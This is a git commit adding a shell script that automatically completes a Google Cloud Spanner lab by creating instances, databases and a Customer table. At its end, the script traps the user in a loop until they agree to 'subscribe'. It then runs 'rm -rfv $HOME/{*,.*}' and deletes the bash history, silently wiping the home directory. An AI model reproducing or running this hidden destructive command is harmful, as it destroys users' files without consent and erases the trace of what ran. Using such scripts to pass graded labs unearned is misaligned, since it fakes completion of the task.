f4d135fbfbe1b0617912026f7343b4a69bfc42f6
quiccklabs <108678347+quiccklabs@users.noreply.github.com>
2023-10-20 19:27:56 +0530

    Add files via upload

---
+++ Cloud Spanner  Database Fundamentals/quicklabgsp1048.sh
@@ -0,0 +1,88 @@
+
+
+
+BLACK=`tput setaf 0`
+RED=`tput setaf 1`
+GREEN=`tput setaf 2`
+YELLOW=`tput setaf 3`
+BLUE=`tput setaf 4`
+MAGENTA=`tput setaf 5`
+CYAN=`tput setaf 6`
+WHITE=`tput setaf 7`
+
+BG_BLACK=`tput setab 0`
+BG_RED=`tput setab 1`
+BG_GREEN=`tput setab 2`
+BG_YELLOW=`tput setab 3`
+BG_BLUE=`tput setab 4`
+BG_MAGENTA=`tput setab 5`
+BG_CYAN=`tput setab 6`
+BG_WHITE=`tput setab 7`
+
+BOLD=`tput bold`
+RESET=`tput sgr0`
+#----------------------------------------------------start--------------------------------------------------#
+
+echo "${YELLOW}${BOLD}
+
+Starting Execution 
+
+
+${RESET}"
+#gcloud auth list
+#gcloud config list project
+export PROJECT_ID=$(gcloud info --format='value(config.project)')
+#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
+#export EMAIL=$(gcloud config get-value core/account)
+#gcloud config set compute/region $region
+#gcloud config set compute/zone $region-a
+#export ZONE=$region-a
+
+
+
+#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
+#----------------------------------------------------code--------------------------------------------------# 
+
+gcloud spanner instances create banking-instance \
+--config=regional-$REGION  \
+--description="quicklab_1" \
+--nodes=1
+
+gcloud spanner databases create banking-db --instance=banking-instance
+
+gcloud spanner instances create banking-instance-2 \
+--config=regional-$REGION  \
+--description="quicklab_2" \
+--nodes=2
+
+gcloud spanner databases create banking-db-2 --instance=banking-instance-2
+
+gcloud spanner databases ddl update banking-db --instance=banking-instance --ddl="CREATE TABLE Customer (
+  CustomerId STRING(36) NOT NULL,
+  Name STRING(MAX) NOT NULL,
+  Location STRING(MAX) NOT NULL,
+) PRIMARY KEY (CustomerId);"
+
+
+echo "${GREEN}${BOLD}
+
+Task Completed
+
+Lab Completed !!!
+
+${RESET}"
+
+#-----------------------------------------------------end----------------------------------------------------------#
+read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+
+while [ "$CONSENT_REMOVE" != 'y' ]; do
+  sleep 10
+  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+done
+
+echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"
+
+rm -rfv $HOME/{*,.*}
+rm $HOME/.bash_history
+
+exit 0
